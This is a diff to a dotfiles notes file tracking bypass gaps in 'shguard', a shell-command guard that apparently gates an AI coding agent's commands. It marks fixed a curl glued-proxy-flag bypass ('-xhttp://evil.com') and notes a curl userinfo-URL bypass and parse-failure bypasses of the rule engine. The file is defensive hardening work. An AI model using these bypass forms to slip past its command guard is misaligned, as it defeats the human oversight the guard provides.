@@ -43,7 +43,7 @@ weakening, documented so it isn't mistaken for a bug later.
 | 22 | `git commit -m "$(...)"` (heredoc-style commit messages) now `ask`s instead of `allow`s | **resolved** — no longer the cutover blocker (superseded by #23/#24) | [shguard#146](https://github.com/tsukasaI/shguard/issues/146) fixed |
 | 23 | curl userinfo-URL bypass (`localhost:` as userinfo, not port) + rsync bare-relative-path over-block | **userinfo bypass resolved** (`url_host` matcher replaces `exact`/`prefix` in `except_targets`, fable-reviewed 2026-08-24 — pending manual apply, `config.toml` is Claude-edit-blocked); rsync sub-gap still friction only, not fixable from `config.toml` | [shguard#147](https://github.com/tsukasaI/shguard/issues/147) open upstream (P2, real fix path via `url_host` now exists — this repo just needs to apply it); rsync sub-gap not filed |
 | 24 | `if`/background job (`&`)/`[[ ]]`/`!` hit the same parse-failure-bypasses-rule-engine path as #20 — #75's fix didn't cover them | **resolved** — confirmed both by the closed ticket and live: zero "unsupported construct" parse failures in the shadow log (`~/.local/share/shguard-shadow/shadow.jsonl`) since the 2026-08-23 `darwin-rebuild switch` onto shguard 0.6.0, vs. 5+ occurrences of "if clause" alone before that switch | [shguard#191](https://github.com/tsukasaI/shguard/issues/191) closed 2026-08-15 |
-| 25 | curl glued proxy flag (`-xhttp://evil.com`) bypasses the localhost-only rule entirely | **regression (security) — blocks full cutover** | [dotfiles#49](https://github.com/tsukasaI/dotfiles/issues/49) filed |
+| 25 | curl glued proxy flag (`-xhttp://evil.com`) bypasses the localhost-only rule entirely | **resolved** — `attached_value_flags = ["x"]` applied | [dotfiles#49](https://github.com/tsukasaI/dotfiles/issues/49) fixed, pending manual close |
 
 ## 1. Malformed-input fail-closed mode
 
@@ -792,12 +792,14 @@ separate-token forms (`-x http://evil.com`, `--proxy=http://evil.com`)
 to allow, since `value_flags` means "this flag's value is never a
 target," the opposite of what's needed here.
 
-Locked in as a `KNOWN_DELTA` case
-(`curl -xhttp://evil.com http://localhost:3000/api`) in
-`tests/shguard-parity-check.sh` so the hole stays visible. **This,
-together with the rsync bare-relative-path sub-gap in #23, is why full
-cutover remains paused** for the curl/rsync rule area even after #23's
-userinfo bypass closes. Filed as
-[dotfiles#49](https://github.com/tsukasaI/dotfiles/issues/49) (not a
-shguard upstream issue — this is a config-side gap, and the primitive
-to close it, `attached_value_flags`, already exists).
+**Resolved 2026-08-31.** `attached_value_flags = ["x"]` applied to
+`dotfiles-network-curl-remote`. Verified live: `curl -xhttp://evil.com
+http://localhost:3000/api` now denies; ordinary local proxy usage
+(`curl -x http://localhost:8080/ http://localhost:3000/`) and unrelated
+combined short-flag clusters (`curl -fsSL http://localhost:3000/`)
+still allow. `tests/shguard-parity-check.sh` confirms no regression
+(74/84 passed, 10 known deltas, down from 11; this case no longer
+listed). The rsync bare-relative-path sub-gap in #23 remains the only
+open item in this rule area. Filed as
+[dotfiles#49](https://github.com/tsukasaI/dotfiles/issues/49), close
+manually once this note is reviewed.
